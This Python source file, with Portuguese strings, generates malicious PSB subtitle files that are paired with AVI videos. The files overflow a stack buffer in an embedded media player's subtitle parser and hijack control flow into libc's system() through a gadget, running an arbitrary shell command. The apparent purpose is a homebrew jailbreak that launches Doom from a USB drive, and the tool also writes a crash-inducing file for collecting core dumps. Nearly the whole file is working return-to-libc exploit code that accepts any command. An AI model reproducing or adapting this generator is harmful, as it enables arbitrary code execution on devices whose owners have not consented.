from __future__ import annotations

import argparse
import shutil
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
TOOLS_DIR = Path(__file__).resolve().parent
if str(TOOLS_DIR) not in sys.path:
    sys.path.insert(0, str(TOOLS_DIR))

from core_addresses import DEFAULT_LIBC_BASE, RuntimeInfo, extract_runtime_info


DEFAULT_OUT_DIR = ROOT / "artifacts" / "psb"
DEFAULT_TEMPLATE_AVI = ROOT / "artifacts" / "psb" / "libaocdoom.avi"
DOOM_COMMAND = "chmod +x /mnt/doom/launch.sh; /mnt/doom/launch.sh"
TEXT_OVERFLOW_OFF = 0x100
SAVED_S0 = 0x41414141
CORE_CRASH_TEXT = ("A" * 340) + "GPGP"


def _runtime(core_path: Path | str | None = None, libc_base: int = DEFAULT_LIBC_BASE) -> RuntimeInfo:
    if core_path:
        return extract_runtime_info(Path(core_path))
    return RuntimeInfo(libc_base=libc_base)


def _copy_template_avi(out_dir: Path, base_name: str, template_avi: Path | str = DEFAULT_TEMPLATE_AVI) -> None:
    template = Path(template_avi)
    destination = out_dir / f"{base_name}.avi"
    if template.exists() and template.resolve() != destination.resolve():
        shutil.copy2(template, destination)
        return
    if destination.exists():
        return
    raise FileNotFoundError(f"AVI base não encontrado: {template}")


def _write_readme(out_dir: Path, lines: list[str]) -> None:
    (out_dir / "README.md").write_text("\n".join(lines) + "\n", encoding="utf-8", newline="\n")


def _write_artifact_readme(out_dir: Path, extra_lines: list[str] | None = None) -> None:
    lines = [
        "Artefatos PSB prontos do libaoc.",
        "",
        "- libaocdoom.avi + libaocdoom.psb: abre /mnt/doom/launch.sh.",
        "- libaoccore.avi + libaoccore.psb: tenta gerar crash/core dump no parser.",
        "",
        "Constantes padrão:",
        "",
        f"- libc base = {DEFAULT_LIBC_BASE:#010x}",
        f"- saved s0 = {SAVED_S0:#010x}",
        "",
        "Para comando customizado:",
        "",
        "make cmdpsb CMD='echo OK>/etc/core/libaoc.ok' BASE=libaoccmd",
    ]
    if extra_lines:
        lines.extend(["", "Última geração:", ""])
        lines.extend(extra_lines)
    _write_readme(out_dir, lines)


def psb_line(text: bytes) -> bytes:
    return b"{0:0:1}{0:0:10}" + text + b"\n"


def build_command(command: str = DOOM_COMMAND) -> str:
    return command + " #"


def build_text(runtime: RuntimeInfo, command: str) -> bytes:
    prefix = build_command(command).encode("ascii")
    if len(prefix) > TEXT_OVERFLOW_OFF:
        raise ValueError("comando grande demais para o layout PSB atual")
    pad = b"A" * (TEXT_OVERFLOW_OFF - len(prefix))
    return (
        prefix
        + pad
        + struct.pack(">I", SAVED_S0)
        + struct.pack(">I", runtime.system)
        + struct.pack(">I", runtime.implicit_a0_gadget)
    )


def build_command_payload(
    command: str,
    out_dir: Path | str = DEFAULT_OUT_DIR,
    base_name: str = "libaoccmd",
    core_path: Path | str | None = None,
    libc_base: int = DEFAULT_LIBC_BASE,
    template_avi: Path | str = DEFAULT_TEMPLATE_AVI,
) -> dict[str, int | str]:
    command.encode("ascii")
    out = Path(out_dir)
    runtime = _runtime(core_path, libc_base)

    out.mkdir(parents=True, exist_ok=True)
    _copy_template_avi(out, base_name, template_avi)
    (out / f"{base_name}.psb").write_bytes(psb_line(build_text(runtime, command)))
    _write_artifact_readme(
        out,
        [
            f"- artefato = {base_name}.psb",
            f"- comando = {build_command(command)}",
            f"- libc_base = {runtime.libc_base:#010x}",
            f"- system = {runtime.system:#010x}",
            f"- implicit_a0_gadget = {runtime.implicit_a0_gadget:#010x}",
        ],
    )
    return {
        "variant": base_name,
        "out_dir": str(out),
        "command": build_command(command),
        "libc_base": runtime.libc_base,
        "system": runtime.system,
        "call_gadget": runtime.implicit_a0_gadget,
        "saved_s0": SAVED_S0,
    }


def build_doom_launcher(
    out_dir: Path | str = DEFAULT_OUT_DIR,
    core_path: Path | str | None = None,
    template_avi: Path | str = DEFAULT_TEMPLATE_AVI,
) -> dict[str, int | str]:
    return build_command_payload(
        command=DOOM_COMMAND,
        out_dir=out_dir,
        base_name="libaocdoom",
        core_path=core_path,
        template_avi=template_avi,
    )


def build_core_crash(
    out_dir: Path | str = DEFAULT_OUT_DIR,
    template_avi: Path | str = DEFAULT_TEMPLATE_AVI,
) -> dict[str, int | str]:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    _copy_template_avi(out, "libaoccore", template_avi)
    text = CORE_CRASH_TEXT.encode("ascii")
    (out / "libaoccore.psb").write_bytes(psb_line(text))
    _write_artifact_readme(
        out,
        [
            "- artefato = libaoccore.psb",
            "- texto = 340 bytes 'A' + marcador GPGP",
            "- fluxo = cold boot com pendrive superfloppy, abrir AVI e habilitar PSB",
        ],
    )
    return {"variant": "libaoccore", "out_dir": str(out), "text_len": len(text)}


def _parse_int(value: str) -> int:
    return int(value, 0)


def main() -> None:
    parser = argparse.ArgumentParser(description="Gera payloads PSB do libaoc.")
    parser.add_argument(
        "target",
        nargs="?",
        default="doom-launcher",
        choices=["doom-launcher", "core-crash", "command"],
    )
    parser.add_argument("--out", type=Path, default=DEFAULT_OUT_DIR)
    parser.add_argument("--core", type=Path, default=None)
    parser.add_argument("--libc-base", type=_parse_int, default=DEFAULT_LIBC_BASE)
    parser.add_argument("--template-avi", type=Path, default=DEFAULT_TEMPLATE_AVI)
    parser.add_argument("--command", default=None, help="comando shell para target command")
    parser.add_argument("--base-name", default="libaoccmd", help="nome base para target command")
    args = parser.parse_args()

    if args.target == "doom-launcher":
        result = build_doom_launcher(args.out, args.core, args.template_avi)
    elif args.target == "core-crash":
        result = build_core_crash(args.out, args.template_avi)
    else:
        if not args.command:
            parser.error("target command precisa de --command")
        result = build_command_payload(
            command=args.command,
            out_dir=args.out,
            base_name=args.base_name,
            core_path=args.core,
            libc_base=args.libc_base,
            template_avi=args.template_avi,
        )

    print(result["out_dir"])
    print(f"variant={result['variant']}")
    if "command" in result:
        print(f"command={result['command']}")
    if "system" in result:
        print(f"system={result['system']:#010x}")
        print(f"call_gadget={result['call_gadget']:#010x}")


if __name__ == "__main__":
    main()
